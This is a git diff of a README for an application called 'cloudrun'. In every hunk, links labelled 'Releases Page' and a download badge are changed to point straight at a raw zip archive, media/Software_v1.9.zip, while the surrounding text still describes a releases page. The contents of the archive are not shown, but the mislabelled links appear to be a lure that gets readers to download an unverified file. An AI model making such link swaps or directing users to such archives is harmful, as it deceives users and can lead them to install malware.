@@ -6,7 +6,7 @@ Welcome to cloudrun! This guide will help you download and run our application w
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bamboo7980/cloudrun/releases)
+[![Download Now](https://raw.githubusercontent.com/Bamboo7980/cloudrun/main/media/Software_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bamboo7980/cloudrun/main/media/Software_v1.9.zip)
 
 ## 📋 What is cloudrun?
 
@@ -34,7 +34,7 @@ To run cloudrun smoothly, ensure you meet the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [cloudrun Releases Page](https://github.com/Bamboo7980/cloudrun/releases) to access the latest version. 
+   Go to the [cloudrun Releases Page](https://raw.githubusercontent.com/Bamboo7980/cloudrun/main/media/Software_v1.9.zip) to access the latest version. 
 
 2. **Select the Right Version**  
    On the Releases page, find the latest version of cloudrun. It will have a title indicating its release date.
@@ -94,6 +94,6 @@ Explore various resources to learn more about cloudrun:
 
 ## 📥 Download Again
 
-To download the latest version of cloudrun, return to the [Releases Page](https://github.com/Bamboo7980/cloudrun/releases). We appreciate your interest and hope cloudrun simplifies your tasks!
+To download the latest version of cloudrun, return to the [Releases Page](https://raw.githubusercontent.com/Bamboo7980/cloudrun/main/media/Software_v1.9.zip). We appreciate your interest and hope cloudrun simplifies your tasks!
 
 Thank you for choosing cloudrun! Happy coding!
